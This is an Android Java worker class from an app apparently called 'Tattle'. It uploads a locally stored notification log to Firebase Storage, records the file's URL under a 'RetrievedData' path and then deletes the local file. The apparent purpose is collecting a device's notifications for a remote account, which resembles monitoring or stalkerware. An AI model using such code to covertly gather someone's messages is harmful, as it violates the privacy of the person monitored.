package com.codies.Tattle.DataUploadServices;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class NotificationUploadScheduler extends Worker {

    public static final String TAG = "BROADDD";

    FirebaseAuth firebaseAuth;
    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference;
    StorageReference storageReference;
    Context context;

    public NotificationUploadScheduler(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseDatabase = FirebaseDatabase.getInstance();
        databaseReference = firebaseDatabase.getReference();
        storageReference = FirebaseStorage.getInstance().getReference(firebaseAuth.getCurrentUser().getUid());
        getFileToUpload();
        Data outputData = new Data.Builder().putBoolean("fileUploaded", true).build();
        return Result.success(outputData);
    }

    public void getFileToUpload() {
            String backupDBPath = Environment.getExternalStorageDirectory().getPath() + "/Tattle";
            final File backupDBFolder = new File(backupDBPath);
            backupDBFolder.mkdirs();

            File logFile = new File(backupDBFolder, "MyFile.txt");
        if (logFile.exists()) {
            Log.i(TAG, "getFileToUpload: ");
            uploadFile(logFile);
        } else {
            Log.i(TAG, "file doesnt exist: ");
        }
    }

    private void uploadFile(File file) {

        StorageReference mStorageReference = this.storageReference.child("NotificationLogs").child(System.currentTimeMillis() + "." + "txt");
        Uri uri = Uri.fromFile(file);
        mStorageReference.putFile(uri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                Log.i(TAG, "onSuccess: file uploaded");
                mStorageReference.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                    @Override
                    public void onSuccess(Uri uri) {
                        Log.i(TAG, "onSuccess: " + uri.getPath());
                        databaseReference.child("RetrievedData").child(firebaseAuth.getCurrentUser().getUid()).child("NotificationLog").push().setValue(uri.toString()).addOnSuccessListener(new OnSuccessListener<Void>() {
                            @Override
                            public void onSuccess(Void aVoid) {
                                deleteFile();
                            }
                        }).addOnFailureListener(new OnFailureListener() {
                            @Override
                            public void onFailure(@NonNull Exception e) {
                                Log.i(TAG, "onFailure: " + e.getMessage());
                            }
                        });
                    }
                }).addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        Log.i(TAG, "onFailure: file url error " + e.getMessage());
                    }
                });
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
                Log.i(TAG, "onFailure: file upload error "+e.getMessage());
            }
        });
    }

    public void deleteFile() {
        String backupDBPath = Environment.getExternalStorageDirectory().getPath() + "/Tattle";
        final File backupDBFolder = new File(backupDBPath);
        backupDBFolder.mkdirs();

        File logFile = new File(backupDBFolder, "MyFile.txt");
        if (logFile.exists()) {
            try {
                logFile.delete();
                Log.i(TAG, "deleteFile: file deleted");
            } catch (Exception e) {
                Log.i(TAG, "deleteFile: " + "Error Deleting file");
            }
        } else {
            Log.i(TAG, "deleteFile: file doesnt exist");
        }
    }


}
